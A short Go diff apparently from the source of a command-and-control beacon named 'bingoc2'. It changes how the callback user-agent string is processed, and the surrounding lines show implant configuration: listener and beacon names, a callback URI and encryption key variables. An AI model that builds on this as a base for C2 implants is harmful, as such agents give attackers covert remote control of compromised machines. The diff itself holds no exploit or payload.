@@ -24,7 +24,7 @@ var (
 	LISTENER_NAME   string = "example listener"    // name of listener calling back to
 	BEACON_NAME     string = "example beacon"      // name of the beacon this agent is from
 	USERAGENT       string = "bingoc2/1.0.0"       // useragent of callback
-	USERAGENT_FIXED string = strings.ReplaceAll(USERAGENT, "////", " ")
+	USERAGENT_FIXED string = strings.ReplaceAll(USERAGENT, "....", " ")
 	URI             string = "index.php" // uri to callback to
 	sKeya           string               // key for encryption
 	sKeyb           string
